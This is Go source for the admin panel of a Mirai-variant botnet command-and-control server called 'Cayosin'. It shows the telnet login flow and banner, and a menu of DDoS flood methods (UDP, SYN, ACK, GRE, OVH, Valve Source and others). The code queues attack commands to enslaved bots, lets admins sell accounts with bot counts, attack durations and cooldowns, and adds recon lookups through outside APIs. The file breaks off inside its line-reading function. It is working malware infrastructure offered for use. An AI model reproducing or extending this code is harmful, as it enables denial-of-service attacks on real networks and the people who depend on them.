package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
	
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[0mWelcome to the \x1b[1;36mCayosin \x1b[0mMirai Variant!\r\n"))
    this.conn.Write([]byte("\x1b[1;36mRespect Others + Device Count\x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[1;36mDO \x1b[31mNOT \x1b[1;36mShare Logins\x1b[0m\r\n"))
    this.conn.Write([]byte("\x1b[1;36mPlan Upgrades Are Available\x1b[0m\r\n\r\n"))
    this.conn.Write([]byte("\x1b[1;33mUsername\x1b[1;36m: \x1b[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;33mPassword\x1b[1;36m: \x1b[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31mInvalid Credentials. Connection Logged!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d | Cayosin | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;36m               ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔           \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[0m               ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[90m               ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝ M.V.        \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m          ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m          ║\x1b[90m- - - - - \x1b[1;36m彼   ら  の  心   を  切  る\x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m          ║\x1b[90m- - - - - \x1b[0mType \x1b[1;36mHELP \x1b[0mfor \x1b[1;36mCommands List \x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m          ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;36mみ ら い\x1b[0m~# "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;36m               ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔           \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[0m               ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[90m               ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝ M.V.        \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m          ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m          ║\x1b[90m- - - - - \x1b[1;36m彼   ら  の  心   を  切  る\x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m          ║\x1b[90m- - - - - \x1b[0mType \x1b[1;36mHELP \x1b[0mfor \x1b[1;36mCommands List \x1b[90m- - - - -\x1b[1;36m║\x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m          ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n"))
	continue
		}	

        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
			this.conn.Write([]byte("\x1b[1;36m╔═════════════════════════════════════╗\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m║ METHODS \x1b[90m- \x1b[0mShows Attack Commands     \x1b[1;36m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m║ TOOLS   \x1b[90m- \x1b[0mShows Available Tools     \x1b[1;36m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m║ ADMIN   \x1b[90m- \x1b[0mShows Admin Commands      \x1b[1;36m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m╚═════════════════════════════════════╝\x1b[0m\r\n"))
            continue
        }

        if err != nil || cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\x1b[1;36m╔═════════════════════════════════════╗\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m║ ADDREG \x1b[90m- \x1b[0mCreate a Regular Account   \x1b[1;36m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m║ ADDADMIN \x1b[90m- \x1b[0mCreate an Admin Account  \x1b[1;36m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m║ REMOVEUSER \x1b[90m- \x1b[0mRemove an Account      \x1b[1;36m║\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m╚═════════════════════════════════════╝\x1b[0m\r\n"))
            continue
        }

        if err != nil || cmd == "METHODS" || cmd == "methods" {
            this.conn.Write([]byte("\x1b[1;36m╔═════════════════════════════════════════════════╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /udpplain [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mPPS Flood  \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /udp [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mReg UDP Flood   \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /std [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mSTD Flood       \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /tcpall [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mAll Flag     \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /dns [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mDNS Flood       \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /vse [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mValve Source    \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /ovh [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mOVH Method      \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /syn [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mSYN (TCP)       \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /asyn [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mASYN (TCP)     \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /usyn [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mUSYN (TCP)     \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /ack [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mACK (TCP)       \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /frag [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mFrag (TCP)     \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /xmas [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mRTCP Flood     \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /stomp [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mMulti-Method  \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /greip [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mGRE IP Encap  \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /greeth [IP] [TIME] dport=[PORT] \x1b[90m- \x1b[0mGRE Ethernet \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m╚═════════════════════════════════════════════════╝\x1b[0m\r\n"))
            continue
        }

        if err != nil || cmd == "TOOLS" || cmd == "tools" {
            this.conn.Write([]byte("\x1b[1;36m╔═══════════════════════════════════╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /ping \x1b[90m- \x1b[0mPing an IPv4              \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /iplookup \x1b[90m- \x1b[0mLookup IPv4           \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /portscan \x1b[90m- \x1b[0mPortscan IPv4         \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /resolve \x1b[90m- \x1b[0mResolve a URL          \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /reversedns \x1b[90m- \x1b[0mFind DNS of an IPv4 \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /asnlookup \x1b[90m- \x1b[0mFind ASN of an IPv4  \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /traceroute \x1b[90m- \x1b[0mTraceroute On IPv4  \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /subnetcalc \x1b[90m- \x1b[0mCalculate A Subnet  \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /whois \x1b[90m- \x1b[0mWHOIS Search             \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m║ /zonetransfer \x1b[90m- \x1b[0mShows ZT          \x1b[1;36m║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;36m╚═══════════════════════════════════╝\x1b[0m\r\n"))
            continue
        }

            if err != nil || cmd == "/IPLOOKUP" || cmd == "/iplookup" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

        if err != nil || cmd == "/PORTSCAN" || cmd == "/portscan" {                  
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError... IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/WHOIS" || cmd == "/whois" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/PING" || cmd == "/ping" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResponse\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

        if err != nil || cmd == "/traceroute" || cmd == "/TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError... IP Address/Host Name Only!033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

        if err != nil || cmd == "/resolve" || cmd == "/RESOLVE" {                  
            this.conn.Write([]byte("\x1b[1;33mURL (Without www.)\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/reversedns" || cmd == "/REVERSEDNS" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/asnlookup" || cmd == "/asnlookup" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

            if err != nil || cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
            this.conn.Write([]byte("\x1b[1;33mIPv4 Or Website (Without www.)\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResult\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDREG" {
            this.conn.Write([]byte("\x1b[1;33mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;33mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;33mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;33mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;33mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;36m- New User Info - \r\n- Username - \x1b[1;36m" + new_un + "\r\n\033[0m- Password - \x1b[1;36m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;36m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;36m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;36m" + cooldown_str + "   \r\n\x1b[1;33mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;33mUser Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\x1b[1;33mUsername: \x1b[0m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[1;33mAre You Sure You Want To Remove \x1b[1;36m" + rm_un + "\x1b[1;33m?(y/n): \x1b[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[1;33mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDADMIN" {
            this.conn.Write([]byte("\x1b[1;33mUsername:\x1b[0m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;33mPassword:\x1b[0m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;33mBotcount (-1 for All):\x1b[0m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;33mAttack Duration (-1 for Unlimited):\x1b[0m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;33mCooldown (0 for No Cooldown):\x1b[0m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;36m- New User Info - \r\n- Username - \x1b[1;36m" + new_un + "\r\n\033[0m- Password - \x1b[1;36m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;36m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;36m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;36m" + cooldown_str + "   \r\n\x1b[1;33mContinue? (y/n):\x1b[0m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;33mAdmin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36m%s \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mTotal \x1b[0m[\x1b[1;36m%d\x1b[0m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
